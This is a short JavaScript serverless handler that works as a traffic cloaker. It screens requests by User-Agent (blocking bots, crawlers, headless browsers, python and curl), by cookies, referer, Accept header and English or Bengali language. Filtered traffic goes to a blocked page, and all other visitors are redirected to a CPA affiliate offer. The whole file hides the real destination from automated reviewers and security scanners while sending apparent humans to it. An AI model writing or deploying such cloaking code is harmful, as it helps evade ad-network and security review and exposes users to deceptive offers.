export default function handler(req, res) {
  const ua = req.headers['user-agent'] || '';
  const cookies = req.headers['cookie'] || '';
  const referer = req.headers['referer'] || '';
  const accept = req.headers['accept'] || '';
  const lang = req.headers['accept-language'] || '';

  const suspiciousUA = ["bot", "crawl", "spider", "headless", "scrapy", "python", "curl"];

  if (suspiciousUA.some(term => ua.toLowerCase().includes(term.toLowerCase()))) {
    return res.redirect(302, "https://example.com/blocked.html?reason=ua_bot");
  }
  if (!cookies || cookies.length < 5) {
    return res.redirect(302, "https://example.com/blocked.html?reason=no_cookie");
  }
  if (!referer || referer.length < 5) {
    return res.redirect(302, "https://example.com/blocked.html?reason=no_referer");
  }
  if (!accept.includes("text/html")) {
    return res.redirect(302, "https://example.com/blocked.html?reason=bad_accept");
  }
  if (!(lang.includes("en") || lang.includes("bn"))) {
    return res.redirect(302, "https://example.com/blocked.html?reason=lang_mismatch");
  }

  return res.redirect(302, "https://your-cpa-offer.com");
}
